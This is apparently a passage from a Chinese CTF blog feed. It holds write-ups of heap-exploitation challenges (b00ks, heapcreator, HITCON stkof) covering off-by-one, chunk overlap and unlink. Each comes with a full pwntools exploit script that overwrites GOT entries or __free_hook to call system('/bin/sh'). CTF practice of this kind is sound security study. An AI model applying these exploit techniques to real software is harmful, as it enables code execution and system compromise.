class="line">offset_buu = 0x7fcf162e2010-0x7fcf15d18000</span><br><span class="line">libc_base = book2_name-offset</span><br><span class="line">#libc_base = book2_name - offset_buu</span><br><span class="line">print(&quot;libc_base:&quot;+hex(libc_base))</span><br><span class="line">#free_hook = libc.symbols[&#x27;__free_hook&#x27;]+libc_base</span><br><span class="line">free_hook = 0x3c67a8+libc_base</span><br><span class="line">bin_sh = libc.search(b&#x27;/bin/sh&#x27;).__next__() + libc_base</span><br><span class="line">sys_addr = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">edit(1,p64(bin_sh)+p64(free_hook))</span><br><span class="line">edit(2,p64(sys_addr))</span><br><span class="line">delete(2)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-利用思路2"><a href="#3-利用思路2" class="headerlink" title="3.利用思路2"></a>3.利用思路2</h2><p>上面过程其实都差不多，但是其实直接创造一个unsotedbin，然后用他来leak就好了…因为任意读写其实是个很强大的能力，其实是可以直接把unsortedbin里的main_arena+0x58打出来的，我也是挺好奇以前的大师傅们为啥会用那种方法而不用这种很典型的手段…</p><p>然后电脑快没电了多的也不说了，师傅们看exp自己调调应该也能懂。</p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context(log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)</span><br><span class="line">p = process(&quot;./b00ks&quot;)</span><br><span class="line">#p = process([&#x27;./b00ks&#x27;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23-buu.so&quot;&#125;)</span><br><span class="line">#p = remote(&quot;node4.buuoj.cn&quot;,29403)</span><br><span class="line">elf = ELF(&quot;./b00ks&quot;)</span><br><span class="line">libc=ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)</span><br><span class="line">#libc = ELF(&quot;libc-2.23-buu.so&quot;)</span><br><span class="line">def add(name_size,name,des_size,des):</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;Enter book name size: &quot;)</span><br><span class="line">p.sendline(str(name_size))</span><br><span class="line">p.recvuntil(&quot;Enter book name (Max 32 chars): &quot;)</span><br><span class="line">p.sendline(name)</span><br><span class="line">p.recvuntil(&quot;Enter book description size: &quot;)</span><br><span class="line">p.sendline(str(des_size))</span><br><span class="line">p.recvuntil(&quot;Enter book description: &quot;)</span><br><span class="line">p.sendline(des)</span><br><span class="line">def edit(index,new_des):</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line">p.recvuntil(&quot;Enter the book id you want to edit: &quot;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(&quot;Enter new book description: &quot;)</span><br><span class="line">p.sendline(new_des)</span><br><span class="line">def print_book():</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;4&quot;)</span><br><span class="line">def change_author(author):</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;5&quot;)</span><br><span class="line">p.recvuntil(&quot;Enter author name: &quot;)</span><br><span class="line">p.sendline(author)</span><br><span class="line">def delete(index):</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line">p.recvuntil(&quot;Enter the book id you want to delete: &quot;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Enter author name: &quot;)</span><br><span class="line">p.sendline(b&#x27;a&#x27;*32)</span><br><span class="line">add(0xd0,b&#x27;a&#x27;*8,0x20,b&#x27;b&#x27;*8)</span><br><span class="line">#print_book()</span><br><span class="line">#p.recvuntil(b&#x27;a&#x27;*32)</span><br><span class="line">#book1_addr = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">#add(0x80,b&#x27;c&#x27;*8,0x60,b&#x27;d&#x27;*8)</span><br><span class="line">#add(0x10,b&#x27;f&#x27;*8,0x10,b&#x27;e&#x27;*8)</span><br><span class="line">#payload = p64(1) + p64(book1_addr+0x30) +p64(book1_addr+0x30+0x90+0x70) + p64(0x20) </span><br><span class="line">#edit(1,payload)</span><br><span class="line">#delete(2)</span><br><span class="line">#change_author(b&#x27;a&#x27;*32)</span><br><span class="line">#print_book()</span><br><span class="line">#p.recvuntil(&quot;Name: &quot;)</span><br><span class="line">#main_arena = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))-0x58</span><br><span class="line">#libc_base = main_arena-0x10-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">#free_hook = libc_base + libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">#bin_sh = libc_base + libc.search(b&#x27;/bin/sh&#x27;).__next__()</span><br><span class="line">#sys_addr  = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">#add(0x80,b&#x27;m&#x27;*8,0x60,b&#x27;n&#x27;*8)</span><br><span class="line">#payload = p64(4)+p64(bin_sh)+p64(free_hook)+p64(0x8)</span><br><span class="line">#edit(1,payload)</span><br><span class="line">#edit(4,p64(sys_addr))</span><br><span class="line">#delete(4)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总结的话就是任意读写真的是个很强大的能力，看到结构体就该想到去利用他的指针。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这题早就做完了，依旧是ctfwiki系列，就是最近有点摸鱼，一直不想写…&lt;/p&gt;
&lt;p&gt;另外庆祝一下自己总算是有队要了，还是挺开心的，只是觉得自己太菜了也太懒了不配呆在队里，虽然暂时也只是见习队员，希望自己能努力学习早日转正吧。&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctfwiki" scheme="http://example.com/tags/ctfwiki/"/>
    
  </entry>
  
  <entry>
    <title>heap_extend heapcreator</title>
    <link href="http://example.com/2021/10/21/heap-extend-heapcreator/"/>
    <id>http://example.com/2021/10/21/heap-extend-heapcreator/</id>
    <published>2021-10-21T12:13:36.000Z</published>
    <updated>2021-10-25T07:22:37.825Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>ctfwiki，堆重叠(chunk extend and overlapping)以及例题heapcreator，欠的第二篇博客，还有一篇写的好累</p><span id="more"></span><h1 id="2-堆重叠"><a href="#2-堆重叠" class="headerlink" title="2.堆重叠"></a>2.堆重叠</h1><p>感觉就是更改size位和prev_size位造成overlapping或者shrink，很好理解没啥好说的</p><h1 id="3-hitcontraining-heapcreator"><a href="#3-hitcontraining-heapcreator" class="headerlink" title="3.hitcontraining_heapcreator"></a>3.hitcontraining_heapcreator</h1><h2 id="1-逆向"><a href="#1-逆向" class="headerlink" title="1.逆向"></a>1.逆向</h2><h3 id="1-add"><a href="#1-add" class="headerlink" title="1.add"></a>1.add</h3><p><img src="/2021/10/21/heap-extend-heapcreator/1.png" alt="1"></p><p>没啥好说，先malloc一个0x10的堆块，在这里存储他的大小以及地址，然后紧接着malloc(size)</p><h3 id="2-delete"><a href="#2-delete" class="headerlink" title="2.delete"></a>2.delete</h3><p><img src="/2021/10/21/heap-extend-heapcreator/2.png" alt="2"></p><p>很干净。</p><h3 id="3-edit"><a href="#3-edit" class="headerlink" title="3.edit"></a>3.edit</h3><p><img src="/2021/10/21/heap-extend-heapcreator/3.png" alt="3"></p><p>首先按照习惯我们应该看一下read_input，因为大部分off by one漏洞都会出在这种手写的函数上，但是这里没有漏洞我也就不贴图了，就是一个read函数，read_input的两个参数一个是写入的地址，另外一个写入的长度，然后注意这两个参数看起来一样，但其实一个是</p><p><em>((&amp;heaparray+v1)+1)这个指针，一个是</em>(&amp;heaparray+1)这个指针的值再+1，说白了其实就是数组下一个元素和本数组的值+1，对应malloc的地址，和malloc的size+1，所以这里size多+1了，有off by one漏洞，可以覆盖一个字节。</p><p>show函数比较正常，我们就不看了。</p><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h2><p>我的习惯还是一点点看wp</p><p>from pwn import *<br>p = process(“./heapcreator”)</p><h1 id="p-remote-“node4-buuoj-cn”-25871"><a href="#p-remote-“node4-buuoj-cn”-25871" class="headerlink" title="p = remote(“node4.buuoj.cn”,25871)"></a>p = remote(“node4.buuoj.cn”,25871)</h1><p>elf = ELF(“./heapcreator”)<br>libc = ELF(“/lib/x86_64-linux-gnu/libc-2.23.so”)</p><h1 id="libc-ELF-“libc-2-23-buu-so”"><a href="#libc-ELF-“libc-2-23-buu-so”" class="headerlink" title="libc = ELF(“libc-2.23-buu.so”)"></a>libc = ELF(“libc-2.23-buu.so”)</h1><p>def creat(size,content):<br>        p.recvuntil(“Your choice :”)<br>        p.sendline(“1”)<br>        p.recvuntil(“Size of Heap : “)<br>        p.sendline(str(size))<br>        p.recvuntil(“Content of heap:”)<br>        p.sendline(content)<br>        p.recvuntil(“SuccessFul”)<br>def edit_heap(index,content):<br>        p.recvuntil(“Your choice :”)<br>        p.sendline(“2”)<br>        p.recvuntil(“Index :”)<br>        p.sendline(str(index))<br>        p.recvuntil(“Content of heap : “)<br>        p.sendline(content)<br>def show_heap(index):<br>        p.recvuntil(“Your choice :”)<br>        p.sendline(“3”)<br>        p.recvuntil(“Index :”)<br>        p.sendline(str(index))<br>def delete(index):<br>        p.recvuntil(“Your choice :”)<br>        p.sendline(“4”)<br>        p.recvuntil(“Index :”)<br>        p.sendline(str(index))</p><p>程序的功能实现，没啥好说的</p><p>creat(0x18,b’a’<em>8)<br>creat(0x10,b’b’</em>8)<br>creat(0x10,b’c’*8)<br>creat(0x10,b’/bin/sh’)</p><p>创建4个chunk，因为每次会创建一个0x10的chunk，我用chunk_struct来代指，这里第一个chunk用0x18，大家可以自己调试一下，这样会复用下一个chunk的prev_size，也就是我们可以通过off by one来直接覆盖下一个chunk的size位，如果用0x20,0x30这种就只能覆盖到prev_size</p><p>edit_heap(0,b’c’<em>0x18+p64(0x81))<br>delete(1)<br>size = b’\x08’.ljust(8, b’\x00’)<br>payload = b’d’</em>0x40 + size + p64(elf.got[‘free’])<br>creat(0x70,payload)<br>show_heap(2)<br>p.recvuntil(b”Content : “)<br>puts_addr = u64(p.recv(6).ljust(8, b’\x00’))<br>libc_base = puts_addr - libc.symbols[‘free’]<br>sys_addr = libc_base + libc.symbols[‘system’]<br>edit_heap(2,p64(sys_addr))<br>delete(3)<br>gdb.attach(p)<br>p.interactive()</p><p>然后我们通过off by one修改了chunk1_struct的size位，再将他delete然后再malloc(0x70),系统就会把他拿出来，同时我们通过creat同时的写入功能覆盖了chunk2_struct中存储chunk2地址的指针为free的got表，然后常规操作覆写got表即可。</p><p>贴一下完整exp</p><p>from pwn import *<br>p = process(“./heapcreator”)</p><h1 id="p-remote-“node4-buuoj-cn”-25871-1"><a href="#p-remote-“node4-buuoj-cn”-25871-1" class="headerlink" title="p = remote(“node4.buuoj.cn”,25871)"></a>p = remote(“node4.buuoj.cn”,25871)</h1><p>elf = ELF(“./heapcreator”)<br>libc = ELF(“/lib/x86_64-linux-gnu/libc-2.23.so”)</p><h1 id="libc-ELF-“libc-2-23-buu-so”-1"><a href="#libc-ELF-“libc-2-23-buu-so”-1" class="headerlink" title="libc = ELF(“libc-2.23-buu.so”)"></a>libc = ELF(“libc-2.23-buu.so”)</h1><p>def creat(size,content):<br>    p.recvuntil(“Your choice :”)<br>    p.sendline(“1”)<br>    p.recvuntil(“Size of Heap : “)<br>    p.sendline(str(size))<br>    p.recvuntil(“Content of heap:”)<br>    p.sendline(content)<br>    p.recvuntil(“SuccessFul”)<br>def edit_heap(index,content):<br>    p.recvuntil(“Your choice :”)<br>    p.sendline(“2”)<br>    p.recvuntil(“Index :”)<br>    p.sendline(str(index))<br>    p.recvuntil(“Content of heap : “)<br>    p.sendline(content)<br>def show_heap(index):<br>    p.recvuntil(“Your choice :”)<br>    p.sendline(“3”)<br>    p.recvuntil(“Index :”)<br>    p.sendline(str(index))<br>def delete(index):<br>    p.recvuntil(“Your choice :”)<br>    p.sendline(“4”)<br>    p.recvuntil(“Index :”)<br>    p.sendline(str(index))</p><p>creat(0x18,b’a’<em>8)<br>creat(0x10,b’b’</em>8)<br>creat(0x10,b’c’<em>8)<br>creat(0x10,b’/bin/sh’)<br>edit_heap(0,b’c’</em>0x18+p64(0x81))<br>delete(1)<br>size = b’\x08’.ljust(8, b’\x00’)<br>payload = b’d’*0x40 + size + p64(elf.got[‘free’])<br>creat(0x70,payload)</p><h1 id="show-heap-2"><a href="#show-heap-2" class="headerlink" title="show_heap(2)"></a>show_heap(2)</h1><h1 id="p-recvuntil-b”Content-“"><a href="#p-recvuntil-b”Content-“" class="headerlink" title="p.recvuntil(b”Content : “)"></a>p.recvuntil(b”Content : “)</h1><h1 id="puts-addr-u64-p-recv-6-ljust-8-b’-x00’"><a href="#puts-addr-u64-p-recv-6-ljust-8-b’-x00’" class="headerlink" title="puts_addr = u64(p.recv(6).ljust(8, b’\x00’))"></a>puts_addr = u64(p.recv(6).ljust(8, b’\x00’))</h1><h1 id="libc-base-puts-addr-libc-symbols-‘free’"><a href="#libc-base-puts-addr-libc-symbols-‘free’" class="headerlink" title="libc_base = puts_addr - libc.symbols[‘free’]"></a>libc_base = puts_addr - libc.symbols[‘free’]</h1><h1 id="sys-addr-libc-base-libc-symbols-‘system’"><a href="#sys-addr-libc-base-libc-symbols-‘system’" class="headerlink" title="sys_addr = libc_base + libc.symbols[‘system’]"></a>sys_addr = libc_base + libc.symbols[‘system’]</h1><h1 id="edit-heap-2-p64-sys-addr"><a href="#edit-heap-2-p64-sys-addr" class="headerlink" title="edit_heap(2,p64(sys_addr))"></a>edit_heap(2,p64(sys_addr))</h1><h1 id="delete-3"><a href="#delete-3" class="headerlink" title="delete(3)"></a>delete(3)</h1><p>gdb.attach(p)<br>p.interactive()</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;ctfwiki，堆重叠(chunk extend and overlapping)以及例题heapcreator，欠的第二篇博客，还有一篇写的好累&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>unlink</title>
    <link href="http://example.com/2021/10/15/unlink/"/>
    <id>http://example.com/2021/10/15/unlink/</id>
    <published>2021-10-14T16:15:59.000Z</published>
    <updated>2021-10-22T09:50:52.089Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言以及一点点感慨"><a href="#1-前言以及一点点感慨" class="headerlink" title="1.前言以及一点点感慨"></a>1.前言以及一点点感慨</h1><p>最近学完了unlink，做一下记录吧，还是挺感慨的，最近堆题有时候真是一题调晚上，甚至是一天，但是慢慢找到堆题的技巧了，感觉自己至少知道该如何调试一个程序了，自己最大的进步就是以前看着wp无法getshell的时候会不知道怎么办，现在知道该如何一点点去调试，看看底层哪里出了问题，然后找到问题的所在，所以慢慢的自己可以学会一个一个手法，有一种自己真正入门了的感觉。虽然学的很慢，但是相信总有一天我会把所有东西学会的。</p><span id="more"></span><h1 id="2-unlink"><a href="#2-unlink" class="headerlink" title="2.unlink"></a>2.unlink</h1><p>讲unlink之前还是想再感慨一下，其实这个时候反思一下，才觉得自己原来的学习方法不是太好，刚开始看ctfwiki那些攻击手法真的一点也看不下去，现在想想，每一个攻击手法都是有目的，我们应该先弄清楚，我们通过这个手法获得了什么能力，通过例题最好，去看现象也行，然后再去仔细看那些其他的东西，而不是上来被一大堆指针绕来绕去，最后也不知道文章说了什么。</p><p>所以，我们觉得我们首先应该来看看我们通过unlink获得了什么能力，按照我目前的理解，其实就是我们修改了一个指向chunk的指针ptr变成了&amp;ptr-0x18，这里可能表达不太准确有点抽象，举个例子就清楚了，比如一个数组本身的地址是0xaaaaa里存放着一个指针0xffffff，我们其实就是把0xffffff变成了0xaaaaa-0x18而已，大家可能会觉得他没什么卵用，但其实还是有用的，通过他我们可以完成覆写got表等操作。</p><p>但是现在想要触发unlink，需要通过检测，我还是想先写一下例题，也可以让我自己更好的理解unlink，希望大家跟着一起调一调</p><h1 id="3-2014-HITCON-stkof"><a href="#3-2014-HITCON-stkof" class="headerlink" title="3.2014 HITCON stkof"></a>3.2014 HITCON stkof</h1><p>菜单题，main和menu都没什么好说的，直接看功能吧</p><h2 id="1-alloc"><a href="#1-alloc" class="headerlink" title="1.alloc"></a>1.alloc</h2><p><img src="/2021/10/15/unlink/1.jpg" alt="1"></p><p>没啥好说的，很干净，值得注意的是，这里把chunk的地址存储在了globals这个全局变量里，我们后面的unlink也是对这里进行攻击。</p><h2 id="2-free-chunk"><a href="#2-free-chunk" class="headerlink" title="2.free_chunk"></a>2.free_chunk</h2><p><img src="/2021/10/15/unlink/2.png" alt="2"></p><p>也是很干净的函数，free以后把指针清0，没有uaf</p><h2 id="3-fill"><a href="#3-fill" class="headerlink" title="3.fill"></a>3.fill</h2><p><img src="/2021/10/15/unlink/3.png" alt="3"></p><p>本题最大的漏洞所在，因为向chunk写入内容的时候，重新指定了内容的size，并且没有任何限制，于是造成了堆溢出的漏洞</p><h2 id="4-程序调试"><a href="#4-程序调试" class="headerlink" title="4.程序调试"></a>4.程序调试</h2><p>下面我们来跟着wp一步步调试程序，看看unlink的过程中到底发生了什么</p><p>我们先把前面的函数功能写好</p><p>这里head就是存储chunk地址的全局变量的数组所在的地址</p><p>from pwn import *<br>p = process(“./stkof”)</p><h1 id="p-remote-“node4-buuoj-cn”-27758"><a href="#p-remote-“node4-buuoj-cn”-27758" class="headerlink" title="p = remote(“node4.buuoj.cn”,27758)"></a>p = remote(“node4.buuoj.cn”,27758)</h1><p>elf = ELF(“./stkof”)<br>libc = ELF(‘/lib/x86_64-linux-gnu/libc-2.23.so’)</p><h1 id="libc-ELF-‘-libc-2-23-buu-so’"><a href="#libc-ELF-‘-libc-2-23-buu-so’" class="headerlink" title="libc = ELF(‘./libc-2.23-buu.so’)"></a>libc = ELF(‘./libc-2.23-buu.so’)</h1><p>head = 0x602140<br>def alloc(size):<br>    p.sendline(‘1’)<br>    p.sendline(str(size))<br>    p.recvuntil(b”OK\n”)</p><p>def edit(idx, size, content):<br>    p.sendline(‘2’)<br>    p.sendline(str(idx))<br>    p.sendline(str(size))<br>    p.send(content)<br>    p.recvuntil(b”OK\n”)</p><p>def free(idx):<br>    p.sendline(‘3’)<br>    p.sendline(str(idx))</p><p>注意这里有一个缓冲区的问题，详细可以看ctfwiki，因为比赛将近忙着更有效率的提升，自己暂时也没花时间去看，然后我们申请3个chunk</p><p>alloc(0x100) //chunk1 申请一个较大的chunk解决缓冲区的问题<br>alloc(0x30)//chunk2 用来构造fakechunk<br>alloc(0x80)//chunk3 用一个unsortedbin free的时候触发unlink，前向合并伪造的fakechunk以达到目的</p><p>gdb.attach(p)//调试程序</p><p><img src="/2021/10/15/unlink/5.jpg" alt="5"></p><p>在gdb中可以看到heap的空间如下，有一些奇怪的东西就是缓冲区造成的结构，在这里我们只要关注0x1d81530以及570的chunk2和3就行</p><p>payload = p64(0)// prev_size<br>payload += p64(0x20)//size<br>payload += p64(head + 16 -0x18)//fakefd,其实这里是&amp;fakechunk-0x18<br>payload += p64(head + 16 -0x10)//fakebk,其实这里是&amp;fakechunk-0x10<br>payload += p64(0x20)//nextchunk_prev_size,为了绕过检测<br>payload = payload.ljust(0x30, b’a’)填充一些垃圾数据<br>payload += p64(0x30)这里其实是chunk3的prev_size位，改为0x30也就是chunk2的size是为了unlink时正确的触发前向合并<br>payload += p64(0x90)//把chunk3的prev_inuse位改为了0，也就是从0x91变成了0x90，这样上一个chunk也就是chunk2就会被认为是未被使用，可以成功触发unlink前向合并<br>edit(2,len(payload),payload)//用edit的溢出功能完成payload的写入<br>free(3)//触发unlink<br>p.recvuntil(b”OK\n”)</p><p>这里我们通过向chunk2写入payload伪造了一个fakechunk，并且溢出覆盖了一些重要的比特位，然后free(3)完成unlink。</p><p>但我们的目的是为了通过这道题学习unlink的使用，所以我们先不执行最后的free(3),来到触发unlink前的状态，我们先调试一下看看head这个全局变量的位置存储的是什么，然后再触发unlink看看发生了什么</p><p><img src="/2021/10/15/unlink/6.png" alt="6"></p><p>正如程序所写的那样，存放了3个chunk的地址，然后我们再来看一下我们的payload输进去以后，chunk2和chunk3的位置发生了什么。</p><p><img src="/2021/10/15/unlink/7.png" alt="7"></p><p>其实也没发生什么，就是payload被写在了他该在的位置，这里就是给如果有刚学不太懂的新人演示一下。</p><p>接着，我们来free(3)触发unlink，看看发生了什么神奇的事情。</p><p>我们先来看看head位置发生了什么，这也是unlink的直接效果</p><p><img src="/2021/10/15/unlink/8.png" alt="8"></p><p>我们可以看到，chunk3因为被free所以已经没有了，然后神奇的地方发生了，在0x602150的位置，对比上一张图，存储的是chunk2的地址，现在变成了head - 0x8，也就是head+16-0x18也就是我们构造的fakechunk_fd,这也就是unlink的最终效果，我们把ptr里的内容变成了*（&amp;ptr-0x18）这个指针</p><p>然后我们再来看一下chunk2和chunk3里发生了什么</p><p><img src="/2021/10/15/unlink/9.png" alt="9"></p><p>我们可以看到fakechunk与chunk3发生合并，并且一起被放入了topchunk所以fakechunk_size变成了0x20ac1=0x30+0x90+0x20a01</p><p>而原先的chunk2的指针，已经变成了&amp;ptr-0x18，所以改变指针有什么用呢，比如我们如果再次用过edit（2,payload）的方式写入数据，原本将写入chunk2的位置，现在我们就会写入0x602138的位置，这看起来没什么，但如果我们写入一个指针，就会发生很有意思的事情，让我们继续看</p><p>payload = b’a’*8 + p64(elf.got[‘free’]) + p64(elf.got[‘puts’]) + p64(elf.got[‘atoi’])<br>edit(2,len(payload),payload)</p><p><img src="/2021/10/15/unlink/10.png" alt="10"></p><p>我们可以看到，我们把chunk0的位置写入了free的got表,chunk1的位置写入了puts的got表,chunk2的位置写入了atoi的got表<br>下面我们，最有意思的地方来了，要注意，我们使用edit功能，写入哪里都是通过head这个全局变量存储的地址决定的，所以，当我们再一次使用edit(0,payload)的时候，我们写入的地方就变成了free的got表，我们像free的got表里写入了地址，就像变魔法一样，我们改变了free的got表，也就改变了free这个函数真正的功能。</p><p>payload = p64(elf.plt[‘puts’])<br>edit(0,len(payload),payload)<br>free(1)</p><p>所以我们将puts的plt地址写入了free的got表，于是当我们free(1)的时候，要知道chunk1也被我们变成了puts的got表地址，于是，我们便将puts的got表地址打印出来了，下面就是简单的泄露libc基址。</p><p>然后和修改freegot表一样的操作，用edit(2,payload)来修改atoi的got表为system的地址，然后直接向程序发送”/bin/sh”写入system(“/bin/sh”)就可以getshell，我也就不细说了，大家自己多动手调试调试，我的经验就是pwn一定要自己动手，会有很奇妙的体验和发现</p><p>puts<em>addr = u64(p.recvuntil(b’\nOK\n’,drop=True).ljust(8, b’\x00’))<br>libc<em>base = puts_addr -libc.symbols[‘puts’]<br>binsh_addr = libc_base + libc.search(b’/bin/sh’).__next</em></em>()<br>system_addr = libc_base + libc.symbols[‘system’]<br>payload = p64(system_addr)<br>edit(2,len(payload),payload)<br>p.send(p64(binsh_addr))</p><h1 id="gdb-attach-p"><a href="#gdb-attach-p" class="headerlink" title="gdb.attach(p)"></a>gdb.attach(p)</h1><p>p.interactive()</p><p>这里是后面的代码</p><p>再放一下完整的wp</p><h2 id="3-完整wp"><a href="#3-完整wp" class="headerlink" title="3.完整wp"></a>3.完整wp</h2><p>from pwn import *<br>p = process(“./stkof”)</p><h1 id="p-remote-“node4-buuoj-cn”-27758-1"><a href="#p-remote-“node4-buuoj-cn”-27758-1" class="headerlink" title="p = remote(“node4.buuoj.cn”,27758)"></a>p = remote(“node4.buuoj.cn”,27758)</h1><p>elf = ELF(“./stkof”)<br>libc = ELF(‘/lib/x86_64-linux-gnu/libc-2.23.so’)</p><h1 id="libc-ELF-‘-libc-2-23-buu-so’-1"><a href="#libc-ELF-‘-libc-2-23-buu-so’-1" class="headerlink" title="libc = ELF(‘./libc-2.23-buu.so’)"></a>libc = ELF(‘./libc-2.23-buu.so’)</h1><p>head = 0x602140<br>def alloc(size):<br>    p.sendline(‘1’)<br>    p.sendline(str(size))<br>    p.recvuntil(b”OK\n”)</p><p>def edit(idx, size, content):<br>    p.sendline(‘2’)<br>    p.sendline(str(idx))<br>    p.sendline(str(size))<br>    p.send(content)<br>    p.recvuntil(b”OK\n”)</p><p>def free(idx):<br>    p.sendline(‘3’)<br>    p.sendline(str(idx))<br>alloc(0x100)<br>alloc(0x30)<br>alloc(0x80)<br>payload = p64(0)<br>payload += p64(0x20)<br>payload += p64(head + 16 -0x18)<br>payload += p64(head + 16 -0x10)<br>payload += p64(0x20)<br>payload = payload.ljust(0x30, b’a’)<br>payload += p64(0x30)</p><p>payload += p64(0x90)<br>edit(2,len(payload),payload)<br>free(3)<br>p.recvuntil(b”OK\n”)<br>payload = b’a’*8 + p64(elf.got[‘free’]) + p64(elf.got[‘puts’]) + p64(elf.got[‘atoi’])<br>edit(2,len(payload),payload)<br>payload = p64(elf.plt[‘puts’])<br>edit(0,len(payload),payload)<br>free(1)<br>puts<em>addr = u64(p.recvuntil(b’\nOK\n’,drop=True).ljust(8, b’\x00’))<br>libc<em>base = puts_addr -libc.symbols[‘puts’]<br>binsh_addr = libc_base + libc.search(b’/bin/sh’).__next</em></em>()<br>system_addr = libc_base + libc.symbols[‘system’]<br>payload = p64(system_addr)<br>edit(2,len(payload),payload)<br>p.send(p64(binsh_addr))</p><h1 id="gdb-attach-p-1"><a href="#gdb-attach-p-1" class="headerlink" title="gdb.attach(p)"></a>gdb.attach(p)</h1><p>p.interactive()</p><h1 id="3-unlink的绕过"><a href="#3-unlink的绕过" class="headerlink" title="3.unlink的绕过"></a>3.unlink的绕过</h1><p>unlink的检测主要是这句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// fd bk</span><br><span class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</span><br><span class="line">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br></pre></td></tr></table></figure><p>也就是说，我们的FD-&gt;bk需要=p的地址，同理BK-&gt;fd需要等于p</p><p>也就是说p的前一个chunk的下一个chunk是p，p的下一个chunk的前一个chunk是p</p><p>这里也是最绕人，入门学习起来最困难的地方。</p><p>所以我们用上一道例题，来回想一下我们做了什么</p><p>最主要的就是这里</p><p>payload = p64(0)// prev_size<br>payload += p64(0x20)//size<br>payload += p64(head + 16 -0x18)//fakefd,其实这里是&amp;fakechunk-0x18<br>payload += p64(head + 16 